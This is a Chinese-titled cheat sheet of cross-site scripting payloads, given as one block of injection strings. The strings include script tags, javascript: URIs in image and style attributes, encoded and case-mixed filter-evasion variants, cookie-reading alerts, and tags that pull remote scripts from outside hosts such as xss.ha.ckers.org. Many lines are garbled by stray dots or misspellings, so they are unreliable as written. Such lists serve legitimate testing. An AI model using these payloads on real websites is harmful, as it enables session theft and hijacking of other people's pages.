# 常用测试语句

````
<script>alert('hello，gaga!');</script>
 
>"'><img src="javascript.:alert('XSS')">
 
>"'><script>alert('XSS')</script>
 
<table background='javascript.:alert(([code])'></table>
 
<object type=text/html data='javascript.:alert(([code]);'></object>
 
"+alert('XSS')+"
 
'><script>alert(document.cookie)</script>
 
='><script>alert(document.cookie)</script>
 
<script>alert(document.cookie)</script>
 
<script>alert(vulnerable)</script>
 
<script>alert('XSS')</script>
 
<img src="javascript:alert('XSS')">
 
%0a%0a<script>alert(\"Vulnerable\")</script>.jsp
 
%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
 
%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
 
%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
 
<script>alert('Vulnerable')</script>
 
a.jsp/<script>alert('Vulnerable')</script>
 
"><script>alert('Vulnerable')</script>
 
<IMG SRC="javascript.:alert('XSS');">
 
<IMG src="/javascript.:alert"('XSS')>
 
<IMG src="/JaVaScRiPt.:alert"('XSS')>
 
<IMG src="/JaVaScRiPt.:alert"("XSS")>
 
<IMG SRC="jav    ascript.:alert('XSS');">
 
<IMG SRC="jav
ascript.:alert('XSS');">
 
<IMG SRC="jav
ascript.:alert('XSS');">
 
"<IMG src="/java"\0script.:alert(\"XSS\")>";'>out
 
<IMG SRC=" javascript.:alert('XSS');">
 
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
 
<BODY BACKGROUND="javascript.:alert('XSS')">
 
<BODY ONLOAD=alert('XSS')>
 
<IMG DYNSRC="javascript.:alert('XSS')">
 
<IMG LOWSRC="javascript.:alert('XSS')">
 
<BGSOUND SRC="javascript.:alert('XSS');">
 
<br size="&{alert('XSS')}">
 
<LAYER SRC="http://xss.ha.ckers.org/a.js"></layer>
 
<LINK REL="stylesheet"HREF="javascript.:alert('XSS');">
 
<IMG SRC='vbscript.:msgbox("XSS")'>
 
<META. HTTP-EQUIV="refresh"CONTENT="0;url=javascript.:alert('XSS');">
 
<IFRAME. src="/javascript.:alert"('XSS')></IFRAME>
 
<FRAMESET><FRAME. src="/javascript.:alert"('XSS')></FRAME></FRAMESET>
 
<TABLE BACKGROUND="javascript.:alert('XSS')">
 
<DIV STYLE="background-image: url(javascript.:alert('XSS'))">
 
<DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');">
 
<DIV STYLE="width: expression(alert('XSS'));">
 
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
 
<IMG STYLE='xss:expre\ssion(alert("XSS"))'>
 
<STYLE. TYPE="text/javascript">alert('XSS');</STYLE>
 
<STYLE. TYPE="text/css">.XSS{background-image:url("javascript.:alert('XSS')");}</STYLE><A CLASS=XSS></A>
 
<STYLE. type="text/css">BODY{background:url("javascript.:alert('XSS')")}</STYLE>
 
<BASE HREF="javascript.:alert('XSS');//">
 
getURL("javascript.:alert('XSS')")
 
a="get";b="URL";c="javascript.:";d="alert('XSS');";eval(a+b+c+d);
 
<XML SRC="javascript.:alert('XSS');">
 
"> <BODY NLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"
 
<SCRIPT. SRC="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>
 
<IMG SRC="javascript.:alert('XSS')"
 
<SCRIPT. a=">"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
 
<SCRIPT.=">"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
 
<SCRIPT. a=">"''SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
 
<SCRIPT."a='>'"SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
 
<SCRIPT>document.write("<SCRI");</SCRIPT>PTSRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
 
<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>
````